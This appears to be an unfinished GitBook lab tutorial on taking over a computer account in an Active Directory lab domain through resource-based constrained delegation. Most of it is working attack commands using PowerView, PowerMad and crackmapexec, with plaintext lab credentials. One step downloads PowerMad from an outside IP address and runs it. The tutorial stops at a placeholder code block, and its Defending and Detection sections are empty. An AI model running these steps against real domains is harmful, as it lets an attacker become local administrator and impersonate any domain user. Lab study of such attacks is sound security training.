# Computeraccount Takeover

## Configuring

### Prerequisite

{% content-ref url="../../acl-abuses/owns.md" %}
[owns.md](../../acl-abuses/owns.md)
{% endcontent-ref %}

### Configuring

Nothing need to be configured to abuse this since we set the GenericAll permissions during the "Owns" section. If you would like to configure this it can be configured the same way as we configured "Write Owner".

## Attacking

### How it works

Is you have GenericAll or GenericWrite rights to a computer object you can write to the attribute `msds-AllowedToActOnBehalfOfOtherIdentity`. If you control this attribute you can impersonate and authenticate as any domain user to the computer. Resulting in getting access as local administrator.

### Tools

* [PowerMad](https://github.com/Kevin-Robertson/Powermad)
* [Invoke-DNSUpdate](https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1)

### Executing the attack

#### Prereqesuite

* An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
* A user with write privileges over the target computer which doesn't have msds-AllowedToActOnBehalfOfOtherIdentity

#### Executing the attack

1. It is expected that the GenericAll permissions during the ACL abuses "Write Owner" and "Owns" are set for the `sa_sql` user. This attack will continue from there:

{% content-ref url="../../acl-abuses/owns.md" %}
[owns.md](../../acl-abuses/owns.md)
{% endcontent-ref %}

2\. First we will check that the target doesn't have the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute set.

```
Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 Data01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

![](<../../../../.gitbook/assets/image (18).png>)

The attribute haven't been set yet.

3\. Add the following to the `/etc/hosts` file on Kali otherwise the Crackmapexec command will fail:

```
10.0.0.100 secure.local
10.0.0.100 dc03
10.0.0.100 dc03.secure.local
```

4\. Get the machine account qouta from the domain with Crackmapexec:

```
crackmapexec ldap 10.0.0.100 -u sa_sql -p Iloveyou2 -M MAQ
```

![](<../../../../.gitbook/assets/image (48).png>)

The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain.

5\. Create machine account `FAKE01` with password `123456` with PowerMad:

```
iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.0.0.100 -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](<../../../../.gitbook/assets/image (67).png>)

6\. Get the SID of the computerobject we created:

```
Get-DomainComputer fake01 -Domain secure.local -Credential $creds -Server 10.0.0.100
```

![](<../../../../.gitbook/assets/image (55).png>)

7\. Now we need to create the raw security descriptor which we then will write to the attribute:

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1498997062-1091976085-892328878-1108)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

{% hint style="info" %}
Make sure you changed the SID since it can differ in your lab.
{% endhint %}

![](<../../../../.gitbook/assets/image (49).png>)

8\. Now we can write as `sa_sql` to the `msds-allowedtoactonbehalfofotheridentity` attribute of the computerobject `DATA01`:

```
Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Set-DomainObject -Domain secure.local -Credential $creds -Server 10.0.0.100 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![](<../../../../.gitbook/assets/image (66).png>)

9\. Seems like it worked, now we can check the value of the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute by saving it in a variable and doing some powershell confu to decrypt it:

```
$RawBytes = Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 <SID>
```

![](<../../../../.gitbook/assets/image (52).png>)

10\. `FAKE01` can impersonate any user now to `DATA01`. To do this we first need to calculate the NTLM hash for the `FAKE01` password, we can do this with Rubeus.

```
// Some code
```































## Defending

### Recommendations



### Detection



## References

{% embed url="https://github.com/Kevin-Robertson/Powermad" %}

{% embed url="https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1" %}
